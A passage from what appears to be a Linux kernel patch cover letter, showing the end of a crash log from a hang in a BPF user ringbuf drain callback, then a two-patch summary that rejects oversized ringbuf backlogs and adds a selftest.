[  494.323217][    C2]  ? __pfx_watchdog_timer_fn+0x10/0x10
[  494.323571][    C2]  __hrtimer_run_queues+0x4bf/0x8c0
[  494.323939][    C2]  ? __pfx___hrtimer_run_queues+0x10/0x10
[  494.324321][    C2]  ? srso_alias_return_thunk+0x5/0xfbef5
[  494.324693][    C2]  ? ktime_get_update_offsets_now+0x90/0x2d0
[  494.325117][    C2]  hrtimer_interrupt+0x2cd/0x7e0
[  494.325503][    C2]  ? do_raw_spin_unlock+0x14a/0x1f0
[  494.325920][    C2]  __sysvec_apic_timer_interrupt+0xec/0x380
[  494.326389][    C2]  sysvec_apic_timer_interrupt+0x6c/0x90
[  494.326816][    C2]  </IRQ>
[  494.327035][    C2]  <TASK>
[  494.327287][    C2]  asm_sysvec_apic_timer_interrupt+0x1a/0x20
[  494.327754][    C2] RIP: 0010:bpf_prog_56ce035abe37ff65_drain_cb+0xa0/0xdf
[  494.328314][    C2] Code: f2 31 c9 45 31 c0 e8 73 30 a5 c1 48 85 c0 75 31 48 8b 7b 08 48 83 c7 01 48 89 7b 08 48 83 ff 01 77 2d bf 40 0d 03 00 83 c7 ff <85> ff 74 02 eb f7 8b 7d f0 48 89 7b 18 8b 7d f4 48 89 7b 20 45 31
[  494.329817][    C2] RSP: 0018:ffffc90002d77d60 EFLAGS: 00000217
[  494.330295][    C2] RAX: 0000000000000000 RBX: ffff8881134365f8 RCX: 0000000000000000
[  494.330853][    C2] RDX: 0000000000000008 RSI: 0000000000000070 RDI: 0000000000000bbb
[  494.331422][    C2] RBP: ffffc90002d77d88 R08: ffffc90001474720 R09: fffff520005aefaf
[  494.332019][    C2] R10: ffffc90002d77d7f R11: 00000000003a68f0 R12: 0000000000000008
[  494.332645][    C2] R13: 0000000000000001 R14: ffffc90002d77e50 R15: ffffc90001471000
[  494.333291][    C2]  bpf_user_ringbuf_drain+0x2c7/0x570
[  494.333721][    C2]  ? 0xffffffffc000dd9c
[  494.334075][    C2]  ? __pfx_bpf_user_ringbuf_drain+0x10/0x10
[  494.334546][    C2]  ? srso_alias_return_thunk+0x5/0xfbef5
[  494.335001][    C2]  bpf_prog_8c9b0c57f27a57ab_drain_user_ringbuf+0x7b/0x88
[  494.335560][    C2]  bpf_trampoline_6442594278+0x43/0xa7
[  494.335961][    C2]  __x64_sys_getpgid+0x9/0x40
[  494.336276][    C2]  do_syscall_64+0x6f/0x150
[  494.336600][    C2]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
[  494.337075][    C2] RIP: 0033:0x7d496e6f77b9
[  494.337425][    C2] Code: ff c3 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 44 00 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 27 66 0d 00 f7 d8 64 89 01 48
[  494.338780][    C2] RSP: 002b:00007ffc8d764cf8 EFLAGS: 00000246 ORIG_RAX: 0000000000000079
[  494.339444][    C2] RAX: ffffffffffffffda RBX: 0000574d6cdc22a0 RCX: 00007d496e6f77b9
[  494.340069][    C2] RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000000
[  494.340684][    C2] RBP: 0000000000000000 R08: 00000000fffffff9 R09: 0000000000000040
[  494.341235][    C2] R10: 0000000000000075 R11: 0000000000000246 R12: 00007d496e82b000
[  494.341784][    C2] R13: 00007d496e82d000 R14: 00007ffc8d764d20 R15: 00007d496e82e000
[  494.342379][    C2]  </TASK>
[  494.342809][    C2] Kernel Offset: disabled
[  494.343160][    C2] Rebooting in 10 seconds..
=== END crash log ===

Best regards,
Luxiao Xu

Luxiao Xu (2):
  bpf: Reject user ringbuf backlogs larger than total ring size
  selftests/bpf: Test user ringbuf backlog larger than ring size

 kernel/bpf/ringbuf.c                            |  3 +++
 .../selftests/bpf/prog_tests/user_ringbuf.c     | 17 +++++++++++++++++
 2 files changed, 20 insertions(+)

-- 
2.43.0
